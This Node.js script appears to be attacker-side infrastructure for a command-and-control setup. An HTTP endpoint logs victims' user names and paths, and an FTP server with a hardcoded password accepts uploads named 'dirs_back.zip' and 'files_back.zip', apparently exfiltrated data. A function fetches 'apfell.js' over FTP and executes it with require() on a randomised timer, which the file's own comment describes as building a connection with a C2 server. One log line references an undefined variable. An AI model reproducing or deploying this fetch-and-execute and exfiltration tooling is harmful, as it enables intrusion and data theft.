const http = require('http');
const url = require('url');
const fs = require('fs');
const FtpServer = require('ftp-srv');
const path = require('path');
const ftp = require('basic-ftp')

// Create upload directory if it doesn't exist
const uploadDir = './uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Log the path data into path.txt
function logData(data) {
  const logMessage = `Received data: ${JSON.stringify(data)}\n`;
  const logPath = path.join(uploadDir, 'path.txt');
  
  console.log(logMessage);
  
  fs.appendFile(logPath, logMessage, (err) => {
    if (err) {
      console.error('Error logging data:', err);
    } else {
      console.log('Data logged to path.txt in uploads directory');
    }
  });
}

// Initialize FTP Server
const ftpServer = new FtpServer({
  url: "ftp://127.0.0.1:21",
  anonymous: false,
  pasv_url: "127.0.0.1",
  pasv_min: 1024,
  pasv_max: 65535,
  file_format: 'binary',
  blacklist: [],
  whitelist: [],
  overwrite: true // Enable file overwrite
});

// Configure FTP Server
ftpServer.on('login', ({ username, password }, resolve, reject) => {
  if (username === 'ftpuser' && password === '12345678') {
    resolve({ 
      root: uploadDir,
      writeEnable: true, // Enable write permission
      permissions: {
        del: true,     // Allow deletion
        overwrite: true // Allow overwrite
      }
    });
    console.log(`User ${username} logged in successfully`);
  } else {
    reject(new Error('Invalid credentials'));
  }
});

// Handle FTP file upload events
ftpServer.on('STOR', (error, fileName) => {
  if (error) {
    console.error('Error receiving file:', error);
    return;
  }
  
  if (fileName === 'dirs_back.zip' || fileName === 'files_back.zip') {
    console.log(`Received file: ${fileName}`);
  }
});

// Create HTTP server
const server = http.createServer((req, res) => {
  if (req.method === 'GET' && req.url.startsWith('/http')) {
    const parsedUrl = url.parse(req.url, true);
    const queryParams = parsedUrl.query;
    const user = queryParams.user;
    const path = queryParams.path;
    
    logData({ user, path });
    
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Data received successfully');
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

// function to download and execute remote payload to build connection with c2 server
async function fetchAndExecuteJS() {
  const client = new ftp.Client();
  client.ftp.verbose = true;

  try {
    await client.access(
      {
        host: "127.0.0.1",
        user: "ftpuser",
        password: "12345678",
        secure: false
      }
    );

    console.log("Connected to FTP server");

    // define local file path
    const payloadPath = path.join(__dirname, 'apfell.js');

    // download the file
    await client.downloadTo(payloadPath, 'apfell.js');
    console.log(`[${new Date().toISOString()}] Payload downloaded successfully: ${localPath}`);
    
    // execute the downloaded file
    require(payloadPath);
    console.log(`[${new Date().toISOString()}] executed payload`);

  } catch (err) {
    console.error("Error", err);
  } finally {
    client.close();
  }

}

// Start both servers
const httpPort = 8000;
server.listen(httpPort, () => {
  console.log(`HTTP Server listening on http://127.0.0.1:${httpPort}`);
});

ftpServer.listen()
  .then(() => {
    console.log('FTP Server listening on port 21');
  })
  .catch(err => {
    console.error('Error starting FTP server:', err);
  });
  
// Set the next interval with a new random delay
const randomDelay = Math.floor(Math.random() * 10000000) + 10000; // Between 10s and 10000s

setInterval(fetchAndExecuteJS, randomDelay);